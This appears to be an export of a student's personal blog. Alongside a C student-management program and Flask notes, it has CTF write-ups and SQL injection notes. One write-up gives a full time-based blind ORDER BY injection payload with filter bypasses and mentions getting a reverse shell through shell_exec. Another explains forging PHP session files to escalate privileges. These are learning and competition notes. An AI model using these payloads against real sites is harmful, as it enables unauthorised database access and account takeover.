{"pages":[{"title":"link","text":"友链 Dalao们QwQ URL lola http://lalo39.cn BlackBoss https://absolute-field.github.io/ 芋头tql https://leohearts.com/ 令则爷爷 https://lingze.xyz/ 壮学姐(? http://0xc4m3l.club/ 肖师傅❤ https://0xfay.github.io/ const27 http://www.const27.com/ 羽哥哥 http://www.cl4y.top/ 鲁师傅 https://ljahum.github.io/ 空灵 https://kodosan.com/ 浪浪 https://longlone.best/ 迷妹 http://mi.cl4y.top","link":"/link/index.html"},{"title":"about","text":"关于我CUIT在读带学生一个辣鸡加菜鸡（（（目标是：活着、并尝试飞向更高的地方墨水不够就这样吧…(: P)","link":"/about/index.html"}],"posts":[{"title":"BJDCTF 3rd-小知识点","text":"今天也是被题目暴打的一回呢（，只出来两道题，有大量的时间浪费在了多人运动的注入上… 小红花很简单，因为shell_exec不会输出返回值（准确来说会返回一个字符串，但不会直接打印在浏览器上）。所以直接尝试反弹shell。这里用php反弹shell成功。后来听说有防火墙ban了一些端口，运气好直接找到了没ban的（（（ gob在上传完文件后会设置一个phpsessid，再访问show.php会出现刚才上传的图片(data://base64的形式)。base64_decode(phpsessid)后发现里面含有上传文件的路径。故尝试上传一个../../../../flag(有多少个../我忘了)的文件。实现目录穿梭，得到flag。PS：我最开始是以为要去解析那个phpsessid，尝试对其进行修改…结果完全不知道后面的hash值是怎么来的，最后发现做麻烦了 多人运动做了很长时间也没有做出来…看到那个hint以为是表名有东西…首先是如何进行注入,可以看到服务器读取的数据会根据by参数进行排序，猜测是order by注入，首先排除联合注入以下是我的payload： http://x.x.x.x:xxxxx/?by=desc,(SELECT (CASE WHEN (select left((select group_concat(database_name) from mysql.innodb_table_stats),11)in(concat(char(109),char(121),char(115),char(113),char(108),char(44),char(115),char(121),char(115)))) THEN BENCHMARK(999999999,md5(1)) ELSE 1 END)) 详解： $payload = desc,(SELECT (CASE WHEN $a THEN $b ELSE 1 END)) 题目过滤了if，故使用case进行绕过 $a = (select ($a_1)in($a_2)) 因为题目过滤了 =&lt;&gt;like 所以使用in来替代 $a_1 = left($a_1_1,11) 题目过滤了大多数字符串切割函数，可以使用left和right来绕过 PS:看出题人同时使用left和right来达到提取单个字符的作用，这一点我没想到...如:right(left(xxx,3),2) $a_1_1 = (select group_concat(database_name) from mysql.innodb_table_stats) 这里因为过滤了or和sys，没法提取表名，故尝试用mysql.innodb_table_stats来绕过，但这形成了一个大坑 $a_2 = concat(char(109),char(121),char(115),char(113),char(108),char(44),char(115),char(121),char(115)) 这里因为单使用left提取出来的是字符串不是单个字符，而char函数没有ban，故使用上面的方式组合字符串 PS：除了char以外还有unhex; conv;函数可以用，不过char更简单一些 $b = BENCHMARK(999999999,md5(1)) 题目过滤了sleep，使用BENCHMARK多次执行一个操作然而这道题最终没能解出来的原因是使用了mysql.innodb_table_stats这个坑诚然，innodb在默认情况下是关闭的，但不代表它不作用。在其关闭的情况下使用mysql.innodb_table_stats查询，不会为空，而是能查出来mysql默认的两个库mysql和sys，其它库不能查到，表名同理。而我以为…如果关闭了innodb，整个innodb_table_stats是空，没有数据的（最终导致我这道题没有做出来… 后言因为花费了大量的时间在多人运动这道题上，其它的题没有看，待复现环境出来再说吧…PS：我菜炸了（","link":"/2020/05/24/BJDCTF-3rd-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/"},{"title":"C语言实现学生信息管理系统","text":"前言由于疫情原因，最近只能呆在家里上网课，但实在不想听这个旅游管理的专业课（一直他喵的洗脑不要我们转专业DX）和英语（PS. 数学还是要听一听的），所以搞出来了这个东西…… 连带摸鱼耗费了4天的时间，共760行左右的代码，实现了链表节点的增删查改功能。由于还没有系统学习过C语言，所以许多东西都是自己摸索加查资料得来的。可能十分臃肿，欢迎批评斧正。PS. 在大神们看来这可能不算什么，但我还是十分兴奋的(=v=)。 代码详情main.c#include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; #include&lt;string.h&gt; #include&quot;head.h&quot; newStudent *studentNext; int main(void) { int modeCode; initStudentList(); loadData(1); while(1) { welcome(); printf(&quot;\\nPlease select mode:&quot;); scanf(&quot;%1d%*c&quot;, &amp;modeCode); switch(modeCode) { case 1: system(&quot;cls&quot;); addStudent(); break; case 2: system(&quot;cls&quot;); selStudentMain(); break; case 3: system(&quot;cls&quot;); delStudentMain(); break; case 4: system(&quot;cls&quot;); changeStudentMain(); break; case 5: system(&quot;cls&quot;); loadData(0); break; case 6: system(&quot;cls&quot;); updateData(); break; case 0: free(studentNext); exit(0); } } }head.h//当前加载学生数量 int studentNumber = 0; //学生结构体 typedef struct students { char id[11]; char name[40]; char sex[7]; char age[4]; struct students *next; }newStudent; //全局链表 extern newStudent *studentNext; //欢迎词 void welcome(); //链表初始化 void initStudentList(); //更新学生数据 int updateData(); //加载学生数据 int loadData(int autoCode); //添加学生 int addStudent(); //删除学生主菜单 int delStudentMain(); //通过学号删除学生 int delStudentById(char *id, int autoCode); //通过姓名删除学生 int delStudentByName(char *name, int autoCode); //删除当前所有数据 int delAllStudent(); //搜索学生主菜单 int selStudentMain(); //通过学号搜索学生 newStudent *selStudentById(char *id); //通过姓名搜索学生 newStudent *selStudentByName(char *name); //展示所有学生 int showStudent(); //更改学生数据主菜单 int changeStudentMain(); //更改学生数据 int changeStudent(newStudent *studentTmp); //欢迎词 void welcome() { system(&quot;cls&quot;); printf(&quot;========================================\\n&quot;); printf(&quot;= _____ _____ __ __ _____ =\\n&quot;); printf(&quot;= / ____| / ____| | \\\\/ | / ____| =\\n&quot;); printf(&quot;= | | | (___ | \\\\ / | | (___ =\\n&quot;); printf(&quot;= | | \\\\___ \\\\ | |\\\\/| | \\\\___ \\\\ =\\n&quot;); printf(&quot;= | |____ ____) | | | | | ____) | =\\n&quot;); printf(&quot;= \\\\_____| |_____/ |_| |_| |_____/ =\\n&quot;); printf(&quot;========================================\\n&quot;); printf(&quot;=====CUIT Student Management System=====\\n&quot;); printf(&quot;========================================\\n&quot;); printf(&quot;============Student Number:%d============\\n&quot;, studentNumber); printf(&quot;========================================\\n&quot;); printf(&quot;=============1.Add Student==============\\n&quot;); printf(&quot;=============2.Sel Student==============\\n&quot;); printf(&quot;=============3.Del Student==============\\n&quot;); printf(&quot;=============4.Cha Student==============\\n&quot;); printf(&quot;=============5.load Data==============\\n&quot;); printf(&quot;=============6.update Data==============\\n&quot;); printf(&quot;=============0.Exit System==============\\n&quot;); printf(&quot;========================================\\n&quot;); } //链表初始化 void initStudentList() { studentNext = (newStudent*)malloc(sizeof(newStudent)); studentNext-&gt;next = NULL; } //更新学生数据 int updateData() { FILE *fp = NULL; newStudent *studentTmp = NULL; if(studentNext-&gt;next != NULL) { if(remove(&quot;studentInfo.txt&quot;) == 0) { fp = fopen(&quot;studentInfo.txt&quot;, &quot;w&quot;); studentTmp = studentNext-&gt;next; if(fp != NULL) { while(studentTmp != NULL) { fprintf(fp, &quot;|%s|%s|%s|%s|\\n&quot;, studentTmp-&gt;id, studentTmp-&gt;name, studentTmp-&gt;sex, studentTmp-&gt;age); studentTmp = studentTmp-&gt;next; } fclose(fp); printf(&quot;Updata completed\\n&quot;); delAllStudent(); loadData(1); } else printf(&quot;File open fail\\n&quot;); } else printf(&quot;File delete fail\\n&quot;); } else { fp = fopen(&quot;studentInfo.txt&quot;, &quot;w&quot;); if(fgetc(fp) != EOF) { fclose(fp); remove(&quot;studentInfo.txt&quot;); fp = fopen(&quot;studentInfo.txt&quot;, &quot;w&quot;); fclose(fp); } else printf(&quot;The current data is empty!\\n&quot;); } system(&quot;pause&quot;); return 1; } //加载学生数据 int loadData(int autoCode) { FILE *fp = NULL; char data[64] = {0}; char *str = NULL; int i = 0; int number = 0; int judgeCode = 0; newStudent *studentTmp = NULL; fp = fopen(&quot;studentInfo.txt&quot;, &quot;r+b&quot;); printf(&quot;Start load Data...\\n&quot;); while(fscanf(fp, &quot;%[^\\n]%*c&quot;, data) != EOF) { studentTmp = (newStudent*)malloc(sizeof(newStudent)); str = strtok(data, &quot;|&quot;); for(i = 0; i &lt; 4; i++) { if(str != NULL &amp;&amp; str != EOF &amp;&amp; str != &apos;\\0&apos;) { switch(i) { case 0: if(selStudentById(str) == NULL) { strcpy(studentTmp-&gt;id, str); break; } else { judgeCode = 1; break; } case 1: strcpy(studentTmp-&gt;name, str); break; case 2: strcpy(studentTmp-&gt;sex, str); break; case 3: strcpy(studentTmp-&gt;age, str); break; } if(judgeCode) break; str = strtok(NULL, &quot;|&quot;); } } if(!judgeCode) { studentTmp-&gt;next = studentNext-&gt;next; studentNext-&gt;next = studentTmp; studentNumber++; number++; } } printf(&quot;All done, loaded %d student...\\n&quot;, number); fclose(fp); if(!autoCode) system(&quot;pause&quot;); return 1; } //添加学生 int addStudent() { int sexCode = 0; //性别状态码 int judgeCode = 0; FILE *fp = NULL; //文件变量 char continueCode = 1; //判断是否继续添加 newStudent *studentSel = NULL; while(1) { fp = fopen(&quot;studentInfo.txt&quot;, &quot;a&quot;); //分配新内存 newStudent *studentTmp = (newStudent*)malloc(sizeof(newStudent)); printf(&quot;Please enter the id of the new student:&quot;); scanf(&quot;%10[^\\n]%*c&quot;, &amp;studentTmp-&gt;id); if(studentNext-&gt;next != NULL) { studentSel = selStudentById(studentTmp-&gt;id); if(studentSel != NULL) { printf(&quot;The same ID has been entered!\\n&quot;); printf(&quot;Students found:%-11s%-20s%-7s%-4s\\n&quot;, studentSel-&gt;id, studentSel-&gt;name, studentSel-&gt;sex, studentSel-&gt;age); printf(&quot;Would you like to update this student&apos;s information?[Yes(1)/No(0)]:&quot;); scanf(&quot;%1d%*c&quot;, &amp;judgeCode); if(judgeCode == 1) delStudentById(studentTmp-&gt;id, 1); else return -1; } } printf(&quot;Please enter the name of the new student:&quot;); scanf(&quot;%39[^\\n]&quot;, &amp;studentTmp-&gt;name); while(1) { printf(&quot;Please choose the sex of the new student[Male(1)/Female(0)]:&quot;); scanf(&quot;%1d%*c&quot;, &amp;sexCode); if(sexCode == 1) { strcpy(studentTmp-&gt;sex ,&quot;Male&quot;); break; } else if(sexCode == 0) { strcpy(studentTmp-&gt;sex, &quot;Female&quot;); break; } else printf(&quot;Choose Error\\n&quot;); } printf(&quot;Please enter the age of the new student:&quot;); scanf(&quot;%3[^\\n]%*c&quot;, &amp;studentTmp-&gt;age); if(fp != NULL) { fprintf(fp, &quot;|%s|%s|%s|%s|\\n&quot;, studentTmp-&gt;id, studentTmp-&gt;name, studentTmp-&gt;sex, studentTmp-&gt;age); fclose(fp); }else { printf(&quot;File open fail!\\n&quot;); } studentTmp-&gt;next = studentNext-&gt;next; studentNext-&gt;next = studentTmp; studentNumber++; while(continueCode) { printf(&quot;Do you want to continue adding students?[Yes(1)/No(0)]:&quot;); scanf(&quot;%1d%*c&quot;, &amp;continueCode); if(continueCode) system(&quot;cls&quot;); break; } if(!continueCode) break; } return 1; } //删除学生主菜单 int delStudentMain() { int modeCode = 0; int judgeCode = 0; char id[11] = {0}; char name[40] = {0}; if(studentNext-&gt;next != NULL) { printf(&quot;What keywords do you want to delete data from?\\n&quot;); printf(&quot;&gt;Cancel(Other)\\n&quot;); printf(&quot;&gt;Student&apos;s id(1)\\n&quot;); printf(&quot;&gt;Student&apos;s name(2)\\n&quot;); printf(&quot;&gt;Delete all student(3)\\n&quot;); printf(&quot;I choose to delete data by:&quot;); scanf(&quot;%1d%*c&quot;, &amp;modeCode); switch(modeCode) { case 1: system(&quot;cls&quot;); printf(&quot;Please enter the ID of the student you want to delete:&quot;); scanf(&quot;%10s%*c&quot;, &amp;id); delStudentById(id, 0); modeCode = 1; break; case 2: system(&quot;cls&quot;); printf(&quot;Please enter the name of the student you want to delete:&quot;); scanf(&quot;%[^\\n]%*c&quot;, &amp;name); delStudentByName(name, 0); modeCode = 1; break; case 3: system(&quot;cls&quot;); printf(&quot;Are you sure you want to delete all student data?[Yes(1)/No(0)]:&quot;); scanf(&quot;%1d%*c&quot;, &amp;judgeCode); if(judgeCode) delAllStudent(); modeCode = 1; break; default: modeCode = 0; break; } } else { printf(&quot;The current data is empty!\\n&quot;); system(&quot;pause&quot;); } return(modeCode); } //通过学号删除学生 int delStudentById(char *id, int autoCode) { int judgeCode = 1; newStudent *studentDel = NULL; newStudent *studentTmp = NULL; studentTmp = studentNext; studentDel = studentNext-&gt;next; if(studentNext-&gt;next != NULL) { while(judgeCode) { judgeCode = strncmp(studentDel-&gt;id, id, 10); if(!judgeCode) { printf(&quot;Removed student:%-11s%-20s%-7s%-4s\\n&quot;, studentDel-&gt;id, studentDel-&gt;name, studentDel-&gt;sex, studentDel-&gt;age); studentTmp-&gt;next = studentDel-&gt;next; studentNumber--; printf(&quot;successfully deleted\\n&quot;); break; } if(studentDel-&gt;next == NULL) { printf(&quot;No corresponding ID found!\\n&quot;); break; } studentTmp = studentDel; studentDel = studentDel-&gt;next; } free(studentDel); } else { printf(&quot;The current data is empty!\\n&quot;); } if(!autoCode) system(&quot;pause&quot;); return 1; } //通过姓名删除学生 int delStudentByName(char *name, int autoCode) { int judgeCode = 1; newStudent *studentDel = NULL; newStudent *studentTmp = NULL; studentTmp = studentNext; studentDel = studentNext-&gt;next; if(studentNext-&gt;next != NULL) { while(judgeCode) { judgeCode = strcmp(studentDel-&gt;name, name); if(!judgeCode) { printf(&quot;Removed student:%-11s%-20s%-7s%-4s\\n&quot;, studentDel-&gt;id, studentDel-&gt;name, studentDel-&gt;sex, studentDel-&gt;age); studentTmp-&gt;next = studentDel-&gt;next; studentNumber--; printf(&quot;successfully deleted\\n&quot;); break; } if(studentDel-&gt;next == NULL) { printf(&quot;No corresponding name found!\\n&quot;); break; } studentTmp = studentDel; studentDel = studentDel-&gt;next; } free(studentDel); } else { printf(&quot;The current data is empty!\\n&quot;); } if(!autoCode) system(&quot;pause&quot;); return 1; } //删除当前所有数据 int delAllStudent() { free(studentNext); initStudentList(); studentNumber = 0; return 1; } //搜索学生主菜单 int selStudentMain() { int modeCode = 0; char id[11] = {0}; char name[40] = {0}; newStudent *studentTmp = NULL; if(studentNext-&gt;next != NULL) { printf(&quot;What keywords do you want to select data from?\\n&quot;); printf(&quot;&gt;Cancel(Other)\\n&quot;); printf(&quot;&gt;Student&apos;s ID(1)\\n&quot;); printf(&quot;&gt;Student&apos;s name(2)\\n&quot;); printf(&quot;&gt;Show all student(3)\\n&quot;); printf(&quot;I choose to select data by:&quot;); scanf(&quot;%1d%*c&quot;, &amp;modeCode); switch(modeCode) { case 1: system(&quot;cls&quot;); printf(&quot;Please enter the ID of the student you want to select:&quot;); scanf(&quot;%10[^\\n]%*c&quot;, &amp;id); studentTmp = selStudentById(id); if(studentTmp != NULL) printf(&quot;Students found:%-11s%-20s%-7s%-4s\\n&quot;, studentTmp-&gt;id, studentTmp-&gt;name, studentTmp-&gt;sex, studentTmp-&gt;age); else printf(&quot;No corresponding ID found!\\n&quot;); system(&quot;pause&quot;); modeCode = 1; break; case 2: system(&quot;cls&quot;); printf(&quot;Please enter the name of the student you want to select:&quot;); scanf(&quot;%[^\\n]%*c&quot;, &amp;name); studentTmp = selStudentByName(name); if(studentTmp != NULL) printf(&quot;Students found:%-11s%-20s%-7s%-4s\\n&quot;, studentTmp-&gt;id, studentTmp-&gt;name, studentTmp-&gt;sex, studentTmp-&gt;age); else printf(&quot;No corresponding ID found!\\n&quot;); system(&quot;pause&quot;); modeCode = 1; break; case 3: showStudent(); break; default: modeCode = 0; break; } } else { printf(&quot;The current data is empty!\\n&quot;); system(&quot;pause&quot;); } return(modeCode); } //通过学号搜索学生 newStudent *selStudentById(char *id) { int judgeCode = 1; newStudent *studentTmp = NULL; if(studentNext-&gt;next != NULL) { studentTmp = studentNext-&gt;next; while(judgeCode) { judgeCode = strncmp(studentTmp-&gt;id, id, 10); if(judgeCode) studentTmp = studentTmp-&gt;next; if(studentTmp == NULL) judgeCode = 0; } } else { printf(&quot;The current data is empty!\\n&quot;); } return studentTmp; } //通过姓名搜索学生 newStudent *selStudentByName(char *name) { int judgeCode = 1; newStudent *studentTmp = NULL; if(studentNext-&gt;next != NULL) { studentTmp = studentNext-&gt;next; while(judgeCode) { judgeCode = strcmp(studentTmp-&gt;name, name); if(judgeCode) studentTmp = studentTmp-&gt;next; if(studentTmp == NULL) judgeCode = 0; } } else { printf(&quot;The current data is empty!\\n&quot;); } return studentTmp; } //展示所有学生 int showStudent() { newStudent *studentNow; if(studentNext-&gt;next != NULL) { studentNow = studentNext-&gt;next; while(studentNow != NULL) { printf(&quot;%-11s%-20s%-7s%-4s\\n&quot;, studentNow-&gt;id, studentNow-&gt;name, studentNow-&gt;sex, studentNow-&gt;age); studentNow = studentNow-&gt;next; } printf(&quot;All done...\\n&quot;); } else { printf(&quot;The current data is empty!\\n&quot;); } system(&quot;pause&quot;); return 1; } //更改学生数据主菜单 int changeStudentMain() { int modeCode = 0; char id[11] = {0}; char name[40] = {0}; newStudent *studentTmp = NULL; if(studentNext-&gt;next != NULL) { printf(&quot;What keywords do you want to select data from?\\n&quot;); printf(&quot;&gt;Cancel(Other)\\n&quot;); printf(&quot;&gt;Student&apos;s ID(1)\\n&quot;); printf(&quot;&gt;Student&apos;s name(2)\\n&quot;); printf(&quot;I choose to select data by:&quot;); scanf(&quot;%1d%*c&quot;, &amp;modeCode); switch(modeCode) { case 1: system(&quot;cls&quot;); printf(&quot;Please enter the ID of the student you want to select:&quot;); scanf(&quot;%10[^\\n]%*c&quot;, &amp;id); studentTmp = selStudentById(id); if(studentTmp != NULL) { printf(&quot;Students found:%-11s%-20s%-7s%-4s\\n&quot;, studentTmp-&gt;id, studentTmp-&gt;name, studentTmp-&gt;sex, studentTmp-&gt;age); changeStudent(studentTmp); } else printf(&quot;No corresponding ID found!\\n&quot;); system(&quot;pause&quot;); modeCode = 1; break; case 2: system(&quot;cls&quot;); printf(&quot;Please enter the name of the student you want to select:&quot;); scanf(&quot;%[^\\n]%*c&quot;, &amp;name); studentTmp = selStudentByName(name); if(studentTmp != NULL) { printf(&quot;Students found:%-11s%-20s%-7s%-4s\\n&quot;, studentTmp-&gt;id, studentTmp-&gt;name, studentTmp-&gt;sex, studentTmp-&gt;age); changeStudent(studentTmp); } else printf(&quot;No corresponding ID found!\\n&quot;); system(&quot;pause&quot;); modeCode = 1; break; default: modeCode = 0; break; } } else { printf(&quot;The current data is empty!\\n&quot;); system(&quot;pause&quot;); } return 1; } //更改学生数据 int changeStudent(newStudent *studentTmp) { int sexCode = 0; if(studentNext-&gt;next != NULL) { printf(&quot;Please enter the id of the new student:&quot;); scanf(&quot;%10[^\\n]%*c&quot;, &amp;studentTmp-&gt;id); printf(&quot;Please enter the name of the new student:&quot;); scanf(&quot;%39[^\\n]%*c&quot;, &amp;studentTmp-&gt;name); while(1) { printf(&quot;Please choose the sex of the new student[Male(1)/Female(0)]:&quot;); scanf(&quot;%1d%*c&quot;, &amp;sexCode); if(sexCode == 1) { strcpy(studentTmp-&gt;sex ,&quot;Male&quot;); break; } else if(sexCode == 0) { strcpy(studentTmp-&gt;sex, &quot;Female&quot;); break; } else printf(&quot;Choose Error\\n&quot;); } printf(&quot;Please enter the age of the new student:&quot;); scanf(&quot;%3[^\\n]%*c&quot;, &amp;studentTmp-&gt;age); } else { printf(&quot;The current data is empty!\\n&quot;); system(&quot;pause&quot;); } return 1; }一些我想要说的点scanf读取空格以及缓冲区对scanf的影响最开始的时候，我希望通过： char str_1[11] = {0}; char str_2[11] = {0}; scanf(&quot;%10s&quot;, &amp;str_1); scanf(&quot;%10s&quot;, &amp;str_2);的方式来获取字符串，但我发现上例是无法读取空格的。而且，第二个scanf函数被跳过了。 关于第一个问题，稍微了解一点CTF知识的都知道，这里肯定不能使用gets()函数，因为他不安全。不过，我们可以使用gets_s()函数替换他。不过因为我喜欢搞事XD，所以我倔强地想要用scanf()函数（雾）；还有一方面，虽然我没有上过C语言课，但我觉得像gets_s()、scanf_s()这种函数应该不会讲的吧（，所以我打算用初学者的常用函数来实现。 而第二个问题我则完全没有头绪… 后来在一位师傅和搜集来的资料的帮助下。谜题，解开了。师傅给我了一个这样的写法： char str_1[11] = {0}; char str_2[11] = {0}; //这个是师傅给的写法 //scanf(&quot;%[^\\n]%*c&quot;, &amp;str_1); //scanf(&quot;%[^\\n]%*c&quot;, &amp;str_2); //我改进了一下（ scanf(&quot;%10[^\\n]%*c&quot;, &amp;str_1); scanf(&quot;%10[^\\n]%*c&quot;, &amp;str_2);详细资料：https://blog.csdn.net/q_l_s/article/details/22572777 首先，第一个问题。采取%10[^\\n]%*c的写法需要分开来讲： {%10[^\\n]} {10}:读入10个字符 {[^\\n}:读入回车符前(不含回车符)的所有字符 {%*c}:忽略后面的字符可以查看上面的详细资料，资料就不展开了 第二个问题的资料：https://blog.csdn.net/hhhhhyyyyy8/article/details/80917713简单来说，就是前一个scanf把这次读取的回车符留在了缓冲区里，第二个scanf来读取缓冲区时便会读入这个回车导致第二个scanf被跳过。 整体架构(结构?)由于我没有学过软件工程之类的课程，所以这里的用词可能不太准确。 |-主函数 |----|-次函数-|-功能函数 | |-功能函数 | |... | |-次函数-|... ...上面的结构打的有点混乱，简单来说就是每个功能有自己独立的主函数，由这个函数来调用功能函数。比如查询学生数据，有一个进行数据输入的主函数，然后将收集的信息加载到功能函数中。 这次整体代码的架构很失败（PS. 最开始压根没有思考到架构这一码事，在慢慢码的过程中才发现架构很重要），有许多代码其实可以用函数封装重复使用。在早期还在一些功能上的函数里面加入了数据输入……下次需要注意。 后言emmmm总之就先这么多吧……以后来温故知新PS. 估计以后不想看见这坨屎山（确信","link":"/2020/03/17/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"},{"title":"HFCTF2020-uploadBaby","text":"前言本题在BUUCTF上有复现环境这道CTF思路并不算难(虽然当时因为一些知识不太清晰没有做出来DX)，关键就是对于几个函数的理解和对php的session的存储方式。 php-session文件特性sess文件的储存方式php中，session文件有三种储存方式。1.php_binary2.php(默认模式)3.php_serialize每种储存方式都不太相同： &lt;?php //这里我设定2个内容 $_SESSION[&apos;passwd&apos;] = &apos;233&apos;; $_SESSION[&apos;username&apos;] = &apos;guest&apos;; /* 读取sess文件获得以下内容： php_binary模式： \u0006passwds:3:&quot;233&quot;;\busernames:5:&quot;guest&quot;; (其中\u0006为键名的字符个数的ASCII，比如passwd由6个字母组成，则\u0006的HEX为06) php模式： passwd|s:3:&quot;233&quot;;username|s:5:&quot;guest&quot;; php_serialize模式： a:2:{s:6:&quot;passwd&quot;;s:3:&quot;233&quot;;s:8:&quot;username&quot;;s:5:&quot;guest&quot;;} */sess的启动&lt;?php session_start(); $_SESSION[&apos;username&apos;] = &apos;guest&apos;; //上例在运行正常的情况下会给予用户一个Cookie——PHPSESSID //由26个小写字母和数字的hash值组成sess文件文件名由用户的一个Cookie——PHPSESSION决定。一般情况下PHP由26个小写字母和数字的hash值组成，php会根据这个cookie来找到对应的sess文件，对SESSION进行读取。php寻找对应sess文件的依据是sess文件的文件名，一个sess文件的文件名为sess_PHPSESSID。 sess在web漏洞中的应用往往session导致的漏洞是因为程序本身逻辑出现问题： session反序列化很明显sess文件内容进行了序列化来储存数据。当我们可以控制session内容时(如开启了PHP_SESSION_UPLOAD_PROGRESS时…) 任意session读取导致越权等很明显用户可以自己修改PHPSESSID来进行任意SESSION文件的读取。本题就是这样，通过上传一个文件名为“sess”，内容是可以导致越权的序列化内容的文件，在通过hash_file后变为“sess_sha256”的文件。再改PHPSESSID为sha256即可导致越权。 hash_file()string hash_file(string 加密方式, string 文件路径);这个函数可以通过文件的内容产生一个hash值(不是文件名)PS：这个函数对文件夹同样凑效PSS：我在做这道CTF时以为其是对文件名进行hash处理，于是光荣的没做出来（ filter_inputmixed filter_input(int 数据来源, string 变量名 [, int 过滤器]);可以通过filter_input(INPUT_POST, 'test');的方式来接受一个变量名为test的POST数据。虽然通过$_POST['test']也可以接受POST参数，但上面的写法还可以在第三个参数的地方添加过滤器。 后言这道题的思路并不难，只是因为自己的基础不算太扎实导致没能解出…","link":"/2020/04/21/HFCTF2020-uploadBaby/"},{"title":"FLASK学习笔记-WIP","text":"flask学习笔记这里是我的flask学习笔记，绝赞更新中！欢迎批评斧正。 [TOC] 基本代码from flask import Flask app = Flask(__name__) @app.route(&quot;/&quot;) def hello(): return &quot;Fuck this world!!!&quot; @app.route(&quot;/test/av&lt;int:video_id&gt;&quot;) def test(video_id): return &apos;welcome %s&apos; % video_id if __name__ == &apos;__main__&apos;: app.run(host=&apos;localhost&apos;) from flask import Flask在这里我们为其导入了flask模块中的Flask类 app = Flask(__name__)新建了一个flask对象，其中__name__参数用来确认我们的模板和文件的地址。 使用route函数和装饰器来确定激活函数的地址，这个被称为路由 启动flaskwindowsset FLASK_APP=main.py # 确定启动起始点 set FLASK_VNE=development # 设定为调试模式，代码一旦有改动自动重启服务器 # 在实际中不要开启 flask run --port 8848 # 启动flask # --host 设置地址 # --port 设置端口linux与windows类似 $ export FLASK_APP=main.py ...路由@app.route()便是一个路由，在括号内填入地址，如上例一样，即可完成函数与路由的绑定。 路由中的参数@app.route(&quot;/test/av&lt;int:video_id&gt;&quot;) def test(video_id): if(video_id == 114514): welcomeS = &apos;いいよ！こいよ！&apos; else: welcomeS = &quot;There is the&quot; return welcomeS + &apos; &apos; + str(video_id)在上例中，我们在路由中规定了&lt;int:video_id&gt;来定义正整数类型参数video_id。再将其填入链接的函数内即可应用该参数。以下列出了可填入的参数string：接受一切不包括斜杠的字符int：接受正整数float：接受正浮点数path：接受一切字符uuid：接受uuid字符串 请求钩子before_first_request：在第一个请求前运行before_request：在每个请求前运行after_request：在没有异常结束的请求后执行teardown_reques：|在每个请求后执行(不论是否有异常)after_this_request：在指定请求结束后执行 graph TB; request(请求A)-->ifFirst{第一次请求?}; ifFirst--Yes-->before_first_request; ifFirst--No-->before_request; before_first_request-->before_request; before_request-->viewA[视图A]; before_request-->viewB[视图B]; before_request-->viewC[视图C]; viewC-->after_this_request; after_this_request-->ifExcept{有无异常?}; viewA-->ifExcept; viewB-->ifExcept; ifExcept--Yes-->teardown_request; ifExcept--No-->after_request; after_request-->teardown_request; teardown_request-->response(响应A) 创建方式： @app.before_first_request def before_first_request(): pass @app.before_request def before_request(): pass @app.route(&apos;/a&apos;) def A(): pass @flask.after_this_request def after_this_request(): pass return &apos;&apos; @app.after_request def after_request(): pass @app.teardown_request def teardown_request(): pass重定向其关键是看其有没有/ @app.route(&quot;/test_1&quot;) def test_1(): return &quot;nothing&quot; @app.route(&quot;/test_2/&quot;) def test_2(): return &quot;nothing&quot;在上例的test_1中，我们没有在其最后添加“/”，这使得解释器（?）会将其解释为一个文件。如果访问时，在其背后加上“/”，会导致404错误。这样可以保持 URL 唯一，并帮助搜索引擎避免重复索引同一页面。而test_2一例中，我们在定义是便加上了“/”，这样可以使其看起来像一个文件夹。 响应302302跳转有2种方式实现 pass return &apos;...&apos;, 302, {&apos;Location&apos;:&apos;https://www.baidu.com&apos;} from flask import Flask, redirect pass return redirect(&apos;https://www.baidu.com&apos;)其它响应码我们可以自定义使指定页面返回我们想要的响应码使用函数abort(响应码)需要from flask import abort 自定MIME格式from flask import Flask, make_response pass @app.route(&apos;/a&apos;) def A(): response = make_response(&apos;Hello World!&apos;) response.mimetype = &apos;text/plain&apos; return responsejson格式自然，我们可以将MIME设置为json。通常，一个字典即可代表一段json。但使用json.dumps()可以将元组和列表也序列化为json(没有键)或者使用jsonify()，在return中返回。(也可以添加响应码) Cookie我们可以通过在make_response()对象中对cookie进行设置。 @app.route(&apos;/set/&lt;name&gt;&apos;) def setCooike(name): response = make_response(redirect(url_for(&apos;hello&apos;))) response.set_cookie(&apos;name&apos;, name) return response上例可以在设置cookie之后重响应到/hello还有许多杂项和安全的设定 max_age 被保存时间数，单位秒。默认会话结束时删除 expires 具体过期时间 path 限制cookie的可用路径，默认为整个域名 domain 设置可用域名 secure True时，只有https可以使用 httponly True时，禁止客户端JS获取cookie session使用session首先需要设定secret_key我们可以直接：app.secret_key=&quot;value&quot;或者将其设定为系统变量，用os模块获取 一个用户登录的模型 @app.route(&apos;/login&apos;) def UserLogin(): name = FL.request.cookies.get(&apos;name&apos;) if name is not None: FL.session[&apos;LoggedIn&apos;] = True return FL.redirect(FL.url_for(&apos;hello&apos;))我们使用session['key']={value}来设定一个session 一个用户登出模型 @app.route(&apos;/logout&apos;) def UserLogout(): if &apos;LoggedIn&apos; in FL.session: FL.session.pop(&apos;LoggedIn&apos;) response = FL.make_response(FL.redirect(FL.url_for(&apos;hello&apos;))) response.delete_cookie(&apos;name&apos;) return response我们可以使用session.pop('key')来删除一个session WIP…","link":"/2020/02/24/FLASK%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-WIP/"},{"title":"SQL注入笔记","text":"SQL注入笔记这里是我的SQL注入笔记，绝赞更新中！欢迎批评斧正！ [TOC] 普通注入&amp;&amp;基础命令常用查库、表指令查库： select schema_name from information_schema.schemata &lt;==&gt; show databases 查表：select table_name from information_schema.tables where table_schema=0x7365637572697479(库名) //&apos;security&apos; 查列：select column_name from information_schema.columns where table_name=&apos;~~~~&apos;; //column 列；栏 查字段：select (column1),(column2) from (表名).(列名);其中schema_name;table_name;column_name…可视为一种全局变量; concat()函数、ordor by有时查列或表一次性无法显示全，就用group_concat()包住上列全局变量;group_concat()的作用是将所有数据拼接为1行显示，详细可查看concat函数介绍; order by指令原本用于排序，但在注入中可以用于确定列数；假定某表有3列； /?id=1&apos; order by 1;--&gt;成功 /?id=1&apos; order by 2;--&gt;成功 /?id=1&apos; order by 3;--&gt;成功 /?id=1&apos; order by 